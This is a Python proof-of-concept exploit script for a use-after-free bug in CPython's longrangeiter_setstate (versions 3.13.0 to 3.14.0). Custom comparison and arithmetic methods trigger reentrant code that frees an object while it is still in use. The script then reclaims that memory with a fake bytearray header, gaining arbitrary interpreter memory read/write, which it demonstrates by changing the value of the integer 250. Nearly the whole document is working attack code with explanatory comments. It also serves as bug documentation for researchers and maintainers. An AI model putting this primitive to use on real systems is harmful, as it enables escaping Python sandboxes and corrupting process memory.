"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: UAF on a controlled object to create a fake bytearray object
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/rangeobject.c#L1042-L1080
"""
static PyObject *
longrangeiter_setstate(PyObject *op, PyObject *state)
{
    longrangeiterobject *r = (longrangeiterobject*)op;
    PyObject *zero = _PyLong_GetZero();  // borrowed reference
    int cmp;

    /* clip the value */
    cmp = PyObject_RichCompareBool(state, zero, Py_LT);
    if (cmp < 0)
        return NULL;
    if (cmp > 0) {
        state = zero;
    }
    else {
        cmp = PyObject_RichCompareBool(r->len, state, Py_LT); // <--- r->len used without incref'ing beforehand
        if (cmp < 0)
            return NULL;
        if (cmp > 0)
            state = r->len;
    }
    PyObject *product = PyNumber_Multiply(state, r->step);
    if (product == NULL)
        return NULL;
    PyObject *new_start = PyNumber_Add(r->start, product);
    Py_DECREF(product);
    if (new_start == NULL)
        return NULL;
    PyObject *new_len = PyNumber_Subtract(r->len, state); // <--- r->len used without incref'ing beforehand
    if (new_len == NULL) {
        Py_DECREF(new_start);
        return NULL;
    }
    PyObject *tmp = r->start;
    r->start = new_start;
    Py_SETREF(r->len, new_len);
    Py_DECREF(tmp);
    Py_RETURN_NONE;
}
"""
# r->len is used plenty of times without incref'ing beforehand, and since most of these funcs can call python code,
# we can abuse this to perform a reentrancy attack to free r->len before we're done using it

# create any longrangeiter object
r = iter(range(2**80, 2**80+1))

# pt1 is used to smuggle our own object into r->len for the second stage
class pt1:
    # want to avoid paths that overwrite `state`, so return False no matter what
    def __gt__(self, other):
        return False
    
    # want to avoid paths that overwrite `state`, so return False no matter what
    def __lt__(self, other):
        return False
    
    # used to make sure `PyObject *product = PyNumber_Multiply(state, r->step);` doesnt fail
    # we dont care what r->start gets set to in the end
    def __mul__(self, other):
        return 1

    # called by `PyObject *new_len = PyNumber_Subtract(r->len, state);`
    # new_len will eventually be set to r->len, concluding the work needed for pt1
    def __rsub__(self, other):
        return pt2(SIZE - 0x18)

# used to perform reentrancy attack to cause a UAF
class pt2(bytes):
    lock = False

    # abuse `cmp = PyObject_RichCompareBool(r->len, state, Py_LT);` since at this point we control r->len and state
    def __lt__(self, other):
        global r, _ref
        if not pt2.lock:
            pt2.lock = True
            # this will remove a ref from r->len, meaning the only ref left is `self`
            r.__setstate__(-1)
            pt2.lock = False
            del self # remove the final ref, freeing the object, but we're not done with it >:)

            # reclaim memory with data for our fake object
            _ref = fake_obj.ljust(SIZE, b"\0")

            # returning NotImplemented will cause execution to continue in catch.__gt__ where it'll receive our evil object
            return NotImplemented
        
        return True
    
    # to make sure r.__setstate__(-1) in __lt__ returns gracefully
    def __sub__(self, other):
        return 1

# will catch our evil object we create in pt2
class catch:
    def __gt__(self, other):
        global mem
        mem = other

        # return True so state gets set to 0 and we can graciously exit without raising an exception
        return True
    
    # to make sure execution goes down the correct path
    def __lt__(self, other):
        return False

# setup
p64 = lambda num: num.to_bytes(8, 'little')
fake_obj = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

SIZE = 0x100

# set up for pt2
r.__setstate__(pt1())

# trigger bug
mem = None
r.__setstate__(catch())
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100